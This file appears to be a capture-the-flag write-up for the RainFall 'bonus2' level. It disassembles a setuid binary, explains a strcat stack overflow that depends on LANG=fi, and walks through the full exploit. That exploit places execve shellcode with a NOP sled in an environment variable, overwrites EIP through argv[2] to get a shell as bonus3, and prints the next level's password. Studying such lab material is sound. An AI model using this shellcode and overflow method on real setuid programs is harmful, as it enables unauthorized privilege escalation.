@@ -1,0 +1,204 @@
+bonus2@RainFall:~$ ls -l
+total 8
+-rwsr-s---+ 1 bonus3 users 5664 Mar  6  2016 bonus2
+bonus2@RainFall:~$ cat bonus2
+...
+Ɛ�������������Ë�$Ð���������U��S��p���t�p�f���Ћ���u��[]Ð�S��[��[�����[�Hello Hyvää päiv
+ää Goedemiddag! LANGfinl8
+                         ����T@���x��������l���n���zR|
+...
+********************************************************************************
+We can see two strings :
+The "Hello" world in Finnish, German and English.
+A string that looks like an environment variable,
+apparently containing a language setting.
+********************************************************************************
+bonus2@RainFall:~$ gdb bonus2
+...
+(gdb) disas main
+Dump of assembler code for function main:
+   0x08048529 <+0>:     push   %ebp
+   0x0804852a <+1>:     mov    %esp,%ebp
+   0x0804852c <+3>:     push   %edi
+   0x0804852d <+4>:     push   %esi
+   0x0804852e <+5>:     push   %ebx
+   0x0804852f <+6>:     and    $0xfffffff0,%esp
+   0x08048532 <+9>:     sub    $0xa0,%esp
+   0x08048538 <+15>:    cmpl   $0x3,0x8(%ebp)
+   0x0804853c <+19>:    je     0x8048548 <main+31>
+   0x0804853e <+21>:    mov    $0x1,%eax
+   0x08048543 <+26>:    jmp    0x8048630 <main+263>
+   0x08048548 <+31>:    lea    0x50(%esp),%ebx
+   0x0804854c <+35>:    mov    $0x0,%eax
+   0x08048551 <+40>:    mov    $0x13,%edx
+   0x08048556 <+45>:    mov    %ebx,%edi
+   0x08048558 <+47>:    mov    %edx,%ecx
+   0x0804855a <+49>:    rep stos %eax,%es:(%edi)
+   0x0804855c <+51>:    mov    0xc(%ebp),%eax
+   0x0804855f <+54>:    add    $0x4,%eax
+   0x08048562 <+57>:    mov    (%eax),%eax
+   0x08048564 <+59>:    movl   $0x28,0x8(%esp)
+   0x0804856c <+67>:    mov    %eax,0x4(%esp)
+   0x08048570 <+71>:    lea    0x50(%esp),%eax
+   0x08048574 <+75>:    mov    %eax,(%esp)
+   0x08048577 <+78>:    call   0x80483c0 <strncpy@plt>
+   0x0804857c <+83>:    mov    0xc(%ebp),%eax
+   0x0804857f <+86>:    add    $0x8,%eax
+   0x08048582 <+89>:    mov    (%eax),%eax
+   0x08048584 <+91>:    movl   $0x20,0x8(%esp)
+   0x0804858c <+99>:    mov    %eax,0x4(%esp)
+   0x08048590 <+103>:   lea    0x50(%esp),%eax
+   0x08048594 <+107>:   add    $0x28,%eax
+   0x08048597 <+110>:   mov    %eax,(%esp)
+   0x0804859a <+113>:   call   0x80483c0 <strncpy@plt>
+   0x0804859f <+118>:   movl   $0x8048738,(%esp)
+   0x080485a6 <+125>:   call   0x8048380 <getenv@plt>
+   0x080485ab <+130>:   mov    %eax,0x9c(%esp)
+   0x080485b2 <+137>:   cmpl   $0x0,0x9c(%esp)
+   0x080485ba <+145>:   je     0x8048618 <main+239>
+   0x080485bc <+147>:   movl   $0x2,0x8(%esp)
+   0x080485c4 <+155>:   movl   $0x804873d,0x4(%esp)
+   0x080485cc <+163>:   mov    0x9c(%esp),%eax
+   0x080485d3 <+170>:   mov    %eax,(%esp)
+   0x080485d6 <+173>:   call   0x8048360 <memcmp@plt>
+   0x080485db <+178>:   test   %eax,%eax
+   0x080485dd <+180>:   jne    0x80485eb <main+194>
+   0x080485df <+182>:   movl   $0x1,0x8049988
+   0x080485e9 <+192>:   jmp    0x8048618 <main+239>
+   0x080485eb <+194>:   movl   $0x2,0x8(%esp)
+   0x080485f3 <+202>:   movl   $0x8048740,0x4(%esp)
+   0x080485fb <+210>:   mov    0x9c(%esp),%eax
+   0x08048602 <+217>:   mov    %eax,(%esp)
+   0x08048605 <+220>:   call   0x8048360 <memcmp@plt>
+   0x0804860a <+225>:   test   %eax,%eax
+   0x0804860c <+227>:   jne    0x8048618 <main+239>
+   0x0804860e <+229>:   movl   $0x2,0x8049988
+   0x08048618 <+239>:   mov    %esp,%edx
+   0x0804861a <+241>:   lea    0x50(%esp),%ebx
+   0x0804861e <+245>:   mov    $0x13,%eax
+   0x08048623 <+250>:   mov    %edx,%edi
+   0x08048625 <+252>:   mov    %ebx,%esi
+   0x08048627 <+254>:   mov    %eax,%ecx
+   0x08048629 <+256>:   rep movsl %ds:(%esi),%es:(%edi)
+   0x0804862b <+258>:   call   0x8048484 <greetuser>
+   0x08048630 <+263>:   lea    -0xc(%ebp),%esp
+   0x08048633 <+266>:   pop    %ebx
+   0x08048634 <+267>:   pop    %esi
+   0x08048635 <+268>:   pop    %edi
+   0x08048636 <+269>:   pop    %ebp
+   0x08048637 <+270>:   ret
+End of assembler dump.
+********************************************************************************
+The first thing we can see in the main is a comparison between argc and 3. If
+this comparison is not true, the main function returns 1. That's how we know
+that we need 2 parameters to run this binary.
+We can also see two strncpy calls, which copy argv[1] and argv[2] into a
+stack buffer.
+Then we can see a getenv call that gets the LANG environment variable content.
+The next step is a double memcmp call, comparing the values of two variables
+containing "fi" and "nl" to LANG content. If LANG == 'fi', then the langage
+variable is set to 1.  If it is equal to 'nl', it is set to 2. Then we can see
+that our stack buffer content is copied directly on the stack by the rep movsl
+instruction, just before the call to greetuser.
+********************************************************************************
+(gdb) disas greetuser
+Dump of assembler code for function greetuser:
+   0x08048484 <+0>:     push   %ebp
+   0x08048485 <+1>:     mov    %esp,%ebp
+   0x08048487 <+3>:     sub    $0x58,%esp
+   0x0804848a <+6>:     mov    0x8049988,%eax
+   0x0804848f <+11>:    cmp    $0x1,%eax
+   0x08048492 <+14>:    je     0x80484ba <greetuser+54>
+   0x08048494 <+16>:    cmp    $0x2,%eax
+   0x08048497 <+19>:    je     0x80484e9 <greetuser+101>
+   0x08048499 <+21>:    test   %eax,%eax
+   0x0804849b <+23>:    jne    0x804850a <greetuser+134>
+   0x0804849d <+25>:    mov    $0x8048710,%edx
+   0x080484a2 <+30>:    lea    -0x48(%ebp),%eax
+   0x080484a5 <+33>:    mov    (%edx),%ecx
+   0x080484a7 <+35>:    mov    %ecx,(%eax)
+   0x080484a9 <+37>:    movzwl 0x4(%edx),%ecx
+   0x080484ad <+41>:    mov    %cx,0x4(%eax)
+   0x080484b1 <+45>:    movzbl 0x6(%edx),%edx
+   0x080484b5 <+49>:    mov    %dl,0x6(%eax)
+   0x080484b8 <+52>:    jmp    0x804850a <greetuser+134>
+   0x080484ba <+54>:    mov    $0x8048717,%edx
+   0x080484bf <+59>:    lea    -0x48(%ebp),%eax
+   0x080484c2 <+62>:    mov    (%edx),%ecx
+   0x080484c4 <+64>:    mov    %ecx,(%eax)
+   0x080484c6 <+66>:    mov    0x4(%edx),%ecx
+   0x080484c9 <+69>:    mov    %ecx,0x4(%eax)
+   0x080484cc <+72>:    mov    0x8(%edx),%ecx
+   0x080484cf <+75>:    mov    %ecx,0x8(%eax)
+   0x080484d2 <+78>:    mov    0xc(%edx),%ecx
+   0x080484d5 <+81>:    mov    %ecx,0xc(%eax)
+   0x080484d8 <+84>:    movzwl 0x10(%edx),%ecx
+   0x080484dc <+88>:    mov    %cx,0x10(%eax)
+   0x080484e0 <+92>:    movzbl 0x12(%edx),%edx
+   0x080484e4 <+96>:    mov    %dl,0x12(%eax)
+   0x080484e7 <+99>:    jmp    0x804850a <greetuser+134>
+   0x080484e9 <+101>:   mov    $0x804872a,%edx
+   0x080484ee <+106>:   lea    -0x48(%ebp),%eax
+   0x080484f1 <+109>:   mov    (%edx),%ecx
+   0x080484f3 <+111>:   mov    %ecx,(%eax)
+   0x080484f5 <+113>:   mov    0x4(%edx),%ecx
+   0x080484f8 <+116>:   mov    %ecx,0x4(%eax)
+   0x080484fb <+119>:   mov    0x8(%edx),%ecx
+   0x080484fe <+122>:   mov    %ecx,0x8(%eax)
+   0x08048501 <+125>:   movzwl 0xc(%edx),%edx
+   0x08048505 <+129>:   mov    %dx,0xc(%eax)
+   0x08048509 <+133>:   nop
+   0x0804850a <+134>:   lea    0x8(%ebp),%eax
+   0x0804850d <+137>:   mov    %eax,0x4(%esp)
+   0x08048511 <+141>:   lea    -0x48(%ebp),%eax
+   0x08048514 <+144>:   mov    %eax,(%esp)
+   0x08048517 <+147>:   call   0x8048370 <strcat@plt>
+   0x0804851c <+152>:   lea    -0x48(%ebp),%eax
+   0x0804851f <+155>:   mov    %eax,(%esp)
+   0x08048522 <+158>:   call   0x8048390 <puts@plt>
+   0x08048527 <+163>:   leave
+   0x08048528 <+164>:   ret
+End of assembler dump.
+********************************************************************************
+In order to make the call to strcat allow us to overflow with the first parameter
+of greetuser function, and change EIP content after the stack, the LANG variable
+must be equal to "fi". This overflow may allow us to store a shellcode, then write
+its address in EIP to get it executed. Let's try to make it segfault.
+The first copy in the buffer is 40 bytes long, so we will fill it completely.
+The second one is 32 bytes long, but the program segfaults way under this, with
+a 14+ bytes long copy. The EIP is located 4 bytes later, and can be overwritten
+with argv[2]. So now we just have to create our payload, put it in the environment,
+and write its address at offset 18 in argv[2].  As we write our shellcode in an
+environment variable, we will write a field of nop before the actual code, in
+order to avoid misplacements.
+********************************************************************************
+bonus2@RainFall:~$ export SHELLCODE=`python -c "print('\x90' * 1024 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80')"`
+bonus2@RainFall:~$ export LANG="fi"
+bonus2@RainFall:~$ gdb bonus2
+...
+(gdb) b *main+31
+Breakpoint 1 at 0x8048548
+(gdb) r aaaaa aaaaaa
+Starting program: /home/user/bonus2/bonus2 aaaaa aaaaaa
+
+Breakpoint 1, 0x08048548 in main ()
+(gdb) x/1s *environ
+0xbfffe4cf:	 "SHELLCODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\
+********************************************************************************
+Now that we have our payload address, we will choose an address in the middle of
+the nop field to avoid offsets problems.
+0xbfffe4cf + (nb_nops / 2) == 0xbfffe4cf + 512 == 0xbfffe6cf
+Let's write this address in EIP with our overflow method.
+********************************************************************************
+(gdb) q
+A debugging session is active.
+
+	Inferior 1 [process 10050] will be killed.
+
+Quit anyway? (y or n) y
+bonus2@RainFall:~$ ./bonus2 $(python -c "print('a' * 40)") $(python -c "print('b' * 18 + '\xcf\xe6\xff\xbf')")
+Hyvää päivää aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbb����
+$ whoami
+bonus3
+$ cat /home/user/bonus3/.pass
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
